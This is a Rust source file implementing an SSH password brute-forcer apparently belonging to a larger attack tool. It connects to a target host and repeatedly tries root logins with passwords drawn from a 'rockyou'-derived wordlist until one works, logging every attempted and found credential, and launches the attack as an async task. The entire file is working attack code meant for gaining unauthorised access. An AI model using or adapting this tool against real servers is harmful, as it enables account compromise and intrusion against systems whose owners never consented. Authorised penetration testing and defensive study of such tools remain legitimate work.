use ssh2::Session;
use core::time;
use std::{net::TcpStream, thread};
use colored::Colorize;
use crate::generators::base_generator::BaseGenerator;

pub struct SSHCracker {
    host: String,
    port: u16,
    generator: BaseGenerator
}

impl SSHCracker {
    pub fn new(host: &str, port: u16) -> Self {
        SSHCracker {
            host: host.to_string(), 
            port,
            generator: BaseGenerator::new("rockyoufirst.txt")
        }
    }

    pub fn attack(&mut self) {
        loop {
            let p = self.generator.generate_word();
            if self.check_ssh_login(self.host.as_str(), self.port, "root", p.as_str()) == true {
                return
            }
        }
    }
    
    pub fn check_ssh_login(&self, host: &str, port: u16, username: &str, password: &str) -> bool {
        let tcp = TcpStream::connect((host, port)).map_err(|e| format!("TCP connection failed: {}", e));

        match tcp {
            Ok(tcp) => {
                let mut sess = Session::new().expect("Failed to create SSH session");

                sess.set_tcp_stream(tcp);
                match sess.handshake() {
                    Ok(_) => {
                        match sess.userauth_password(username, password) {
                            Ok(_) => {
                                log::info!("Login found! target: {} user: {} password: {}", host.green(), username.green(), password.green());
                                sess.authenticated()
                            },
                            Err(e) => {
                                log::info!("Login failed! target: {} user: {} password: {} {}", host.red(), username.red(), password.red(), e.message().purple().italic());
                                false
                            },
                        }
                    },
                    Err(e) => {
                        log::error!("SSH handshake failed: {}", e);
                        thread::sleep(time::Duration::from_millis(20000));
                        false
                    }
                }

                
            },
            Err(e) => {
                println!("Unable to connect to target! {:?}", e);
                false
            }
        }
    }

    
}

pub fn create_ssh_brute_attack_handle(host: &str, port: u16) -> tokio::task::JoinHandle<()> {
    let host = host.to_string();
    tokio::spawn(async move {
        let mut cracker = SSHCracker::new(host.as_str(), port);
        cracker.attack()
    })
}